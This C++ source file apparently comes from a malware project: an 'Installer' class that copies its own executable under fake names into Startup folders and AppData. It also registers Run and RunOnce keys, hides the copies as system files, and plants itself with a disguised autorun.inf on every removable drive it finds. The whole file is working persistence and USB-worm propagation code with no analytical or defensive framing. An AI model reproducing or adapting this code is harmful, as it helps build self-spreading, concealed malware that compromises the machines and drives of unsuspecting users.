#include "stdafx.h"
#include "Installer.h"
#include "Logger.h"
#include "Settings.h"
#include "Util.h"

Installer installer;

Installer::Installer()
{
	GetModuleFileName(NULL, exeName, MAX_PATH);


	wchar_t *appData;
	size_t appDataSize;
	_wdupenv_s(&appData, &appDataSize, L"APPDATA");

	appDataPath[0] = '\0';
	wcscat_s(appDataPath, appData);
	wcscat_s(appDataPath, L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" V_FAKE_NAME1);

	registryPath[0] = '\0';
	wcscat_s(registryPath, appData);
	wcscat_s(registryPath, L"\\" V_FAKE_NAME2);

	free(appData);

	startupPath[0] = '\0';
	wcscat_s(startupPath, L"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" V_FAKE_NAME3);


	const wchar_t* autorunStrU =
		L"[autorun]\r\n"
		L"label="  V_FAKE_USB_LABEL  L"\r\n"
		L"action=" V_FAKE_USB_ACTION L"\r\n"
		L"open="   V_FAKE_USB_FILE   L"\r\n"
		L"icon="   V_FAKE_USB_FILE   L",0";
	const std::wstring autorunStrCpp = autorunStrU;

	autorunBytes = autorunStrCpp.length();
	memcpy(autorunData, autorunStrCpp.c_str(), autorunBytes);

}
Installer::~Installer()
{

}

bool Installer::SetAutorun(bool autorun)
{
	return SetAutorunAppdata(autorun) | SetAutorunRegistry(autorun) | SetAutorunStartup(autorun);
}

bool Installer::InstallOnDrives()
{
	wchar_t drive[_MAX_PATH] = L" :\\";

	for (wchar_t c = 'A'; c <= 'Z'; c++) {
		drive[0] = c;

		this->InstallOnDrive(drive);
	}
	return true;
}
bool Installer::InstallOnDrive(const wchar_t* drive)
{
	wchar_t target[_MAX_PATH] = { 0 };

	if (GetDriveType(drive) != DRIVE_REMOVABLE) {
		return false;
	}

	if (!(PathAppend(target, drive) && PathAppend(target, V_FAKE_USB_FILE))) {
		return false;
	}

	if (!this->CopyTo(target)) {
		return false;
	}

	target[0] = '\0';
	if (!(PathAppend(target, drive) && PathAppend(target, L"autorun.inf"))) {
		return false;
	}

	HANDLE hFile = CreateFile(target, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
		FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return false;
	}

	DWORD written;
	bool ret = (TRUE == WriteFile(hFile, autorunData, autorunBytes, &written, NULL));
	VLog(LMESSAGE, target);

	CloseHandle(hFile);
	return ret;
}

bool Installer::CopyTo(const wchar_t* path)
{
	if (GetFileAttributes(path) != INVALID_FILE_ATTRIBUTES)
	{
		return true;
	}
	else if (CopyFile(exeName, path, FALSE))
	{
		this->HideFile(path);
		return true;
	}
	else
	{
		VLog(LNOTICE, L"Failed to copy file");
		return false;
	}
}
bool Installer::HideFile(const wchar_t* path)
{
	return TRUE == SetFileAttributes(path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
}
bool Installer::SetAutorunAppdata(bool autorun)
{
	if (autorun)
	{
		return this->CopyTo(appDataPath);
	}
	else
	{
		return DeleteFile(appDataPath) != 0;
	}
}
bool Installer::SetAutorunStartup(bool autorun)
{
	if (autorun)
	{
		return this->CopyTo(startupPath);
	}
	else
	{
		return DeleteFile(startupPath) != 0;
	}
}
bool Installer::SetAutorunRegistry(bool autorun)
{
	bool ret = false;

	ret |= this->SetAutorunRegistryWithKey(autorun, HKEY_CURRENT_USER,
		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");

	ret |= this->SetAutorunRegistryWithKey(autorun, HKEY_CURRENT_USER,
		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce");

	ret |= this->SetAutorunRegistryWithKey(autorun, HKEY_LOCAL_MACHINE,
		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");

	ret |= this->SetAutorunRegistryWithKey(autorun, HKEY_LOCAL_MACHINE,
		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce");

	return ret;
}

bool Installer::SetAutorunRegistryWithKey(bool autorun, HKEY key, const wchar_t* subkey) {
	HKEY hKey;

	if (RegCreateKeyEx(key, subkey,
		0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_32KEY, NULL, &hKey, NULL)
		!= ERROR_SUCCESS)
	{
		return false;
	}

	bool ret = false;

	if (autorun)
	{
		if (!this->CopyTo(registryPath))
		{
			goto g_end;
		}

		if (RegSetValueEx(hKey, V_FAKE_NAME2, 0, REG_SZ,
			(const BYTE*)registryPath, (lstrlen(registryPath) + 1) * sizeof(wchar_t))
			!= ERROR_SUCCESS)
		{
			goto g_end;
		}
	}
	else
	{
		RegDeleteValue(hKey, V_FAKE_NAME2);

		if (!DeleteFile(registryPath))
		{
			goto g_end;
		}
	}

	ret = true;
g_end:
	RegCloseKey(hKey);
	return ret;
}